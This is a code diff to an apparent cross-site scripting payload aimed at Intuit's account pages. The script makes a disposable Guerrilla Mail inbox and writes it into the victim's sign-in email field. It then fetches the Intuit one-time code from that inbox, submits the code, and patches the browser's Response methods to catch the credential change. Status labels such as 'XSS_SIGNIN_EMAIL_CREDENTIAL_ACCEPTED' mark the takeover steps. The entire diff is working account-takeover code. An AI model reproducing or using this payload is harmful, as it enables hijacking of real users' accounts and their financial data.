@@ -129,6 +129,12 @@
     input.dispatchEvent(new Event("change", { bubbles: true }));
   }
 
+  function actualInput(node) {
+    if (!node) return null;
+    if (/^(INPUT|TEXTAREA)$/.test(node.tagName || "")) return node;
+    return node.querySelector && node.querySelector("input,textarea");
+  }
+
   function proxyGet(url) {
     return fetch(PROXY + encodeURIComponent(url), {
       method: "GET",
@@ -155,19 +161,29 @@
           encodeURIComponent(mailbox.sid),
       );
       var list = (JSON.parse(raw).list || []).filter(function (message) {
-        return !/welcome to guerrilla/i.test(message.mail_subject || "");
+        var id = String(message.mail_id || "");
+        var senderAndSubject =
+          String(message.mail_from || "") + " " + String(message.mail_subject || "");
+        return id && /intuit|your intuit code/i.test(senderAndSubject);
       });
-      if (list.length) {
+      for (var index = 0; index < list.length; index += 1) {
         var messageRaw = await proxyGet(
           GUERRILLA +
             "?f=fetch_email&email_id=" +
-            encodeURIComponent(list[0].mail_id) +
+            encodeURIComponent(String(list[index].mail_id)) +
             "&sid_token=" +
             encodeURIComponent(mailbox.sid),
         );
         var message = JSON.parse(messageRaw);
-        var body = String(message.mail_body || "").replace(/<[^>]*>/g, " ");
-        var match = body.match(/\b(\d{6})\b/);
+        var text =
+          String(message.mail_subject || "") +
+          " " +
+          String(message.mail_excerpt || "") +
+          " " +
+          String(message.mail_body || "").replace(/<[^>]*>/g, " ");
+        var match =
+          text.match(/(?:code|verification)[^0-9]{0,160}(\d{6})/i) ||
+          text.match(/\b(\d{6})\b/);
         if (match) return match[1];
       }
       if (attempt % 5 === 0) status("OTP_WAIT_" + attempt);
@@ -205,23 +221,26 @@
     }, timeoutMs);
 
     function restore() {
-      Response.prototype.json = originalJson;
-      Response.prototype.text = originalText;
+      if (Response.prototype.json === wrappedJson) Response.prototype.json = originalJson;
+      if (Response.prototype.text === wrappedText) Response.prototype.text = originalText;
       clearTimeout(timer);
     }
 
-    Response.prototype.json = async function () {
+    async function wrappedJson() {
       var value = await originalJson.apply(this, arguments);
       inspect(value);
       return value;
-    };
-    Response.prototype.text = async function () {
+    }
+    async function wrappedText() {
       var value = await originalText.apply(this, arguments);
       try {
         inspect(JSON.parse(value));
       } catch (_) {}
       return value;
-    };
+    }
+
+    Response.prototype.json = wrappedJson;
+    Response.prototype.text = wrappedText;
 
     responseRestore = restore;
     return promise;
@@ -253,14 +272,25 @@
     // short extra settle window for the shell token consumer and cached AM
     // transport before starting the native remediation.
     await sleep(5000);
-    var resultPromise = observeCredentialResult(240000);
 
     var mailbox = await createMailbox();
     showCandidate(mailbox.address);
     status("MAILBOX_READY");
+    emailInput = await waitInputValue(
+      "#ius-email-address-update",
+      10000,
+      function (value) {
+        return value.indexOf("@") > 0;
+      },
+    );
+    emailInput.focus();
     nativeSet(emailInput, mailbox.address);
     emailInput.blur();
     await nextPaint();
+    if (emailInput.value !== mailbox.address) {
+      throw new Error("REACT_EMAIL_VALUE_NOT_COMMITTED");
+    }
+    saveButton = await waitFor("#ius-email-update-btn-save", 10000);
     await waitEnabled(saveButton, 15000);
     status("EMAIL_COMMITTED_TO_NATIVE_FORM");
     saveButton.click();
@@ -275,6 +305,20 @@
 
     var otp = await waitForOtp(mailbox);
     status("OTP_RECEIVED");
+    otpInput = actualInput(
+      await waitFor(
+        '#ius-mfa-confirm-code,input[data-testid="VerifyOtpInput"],[data-testid="VerifyOtpInput"] input',
+        10000,
+      ),
+    );
+    if (!otpInput || !otpInput.isConnected || otpInput.disabled) {
+      throw new Error("LIVE_OTP_INPUT_NOT_FOUND");
+    }
+    otpButton = await waitFor('[data-testid="VerifyOtpSubmitButton"]', 10000);
+
+    // Observe only the credential write that follows the native OTP success.
+    var resultPromise = observeCredentialResult(180000);
+    otpInput.focus();
     nativeSet(otpInput, otp);
     otp = "";
     otpInput.blur();
@@ -293,14 +337,18 @@
         observedAt: new Date().toISOString(),
       };
       status("XSS_SIGNIN_EMAIL_CREDENTIAL_ACCEPTED");
-      await waitInputValue(
-        "#ius-email-address-update",
-        30000,
-        function (value) {
-          return value === mailbox.address;
-        },
-      );
-      status("UI_CONFIRMED_SIGNIN_EMAIL_CHANGED");
+      try {
+        await waitInputValue(
+          "#ius-email-address-update",
+          30000,
+          function (value) {
+            return value === mailbox.address;
+          },
+        );
+        status("UI_CONFIRMED_SIGNIN_EMAIL_CHANGED");
+      } catch (_) {
+        status("UI_REFLECTION_NOT_PRESENT");
+      }
     }
   } catch (error) {
     if (responseRestore) responseRestore();
